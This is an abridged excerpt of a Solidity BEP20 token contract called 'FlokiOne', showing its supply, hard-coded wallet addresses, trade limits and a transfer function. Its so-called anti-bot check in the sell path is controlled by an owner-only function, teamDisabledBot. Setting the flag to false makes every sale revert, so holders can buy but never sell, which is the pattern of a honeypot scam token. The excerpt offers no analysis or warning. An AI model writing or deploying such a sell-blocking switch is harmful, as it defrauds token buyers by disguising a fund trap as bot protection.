...
contract FlokiOne is IBEP20, Ownable
{
    ...
    string private constant _name = 'FlokiOne';
    string private constant _symbol = 'FlokiOne';
    uint8 private constant _decimals = 8;
    uint256 public constant InitialSupply=  100 * 10**_decimals;
    ...
    address public constant TeamWallet=0x732A128cDdF49c1929c36D035c65e1A6c42AAaA4;
    address private constant PancakeRouter=0x6725F303b657a9451d8BA641348b6761A6CC7a17;
    bool antibot = true;

    uint256 private _circulatingSupply =InitialSupply;
    uint256 public  balanceLimit = 3 * 10**_decimals;
    uint256 public  sellLimit = 3 * 10**_decimals;
    uint256 public  buyLimit = 3 * 10**_decimals;
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        if(isSell){
            ...
            require(antibot, "Anti Bot protection");
   ...
   function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private {
    ...
    function teamDisabledBot(bool disabled) public authorized{
        antibot=disabled;
    }
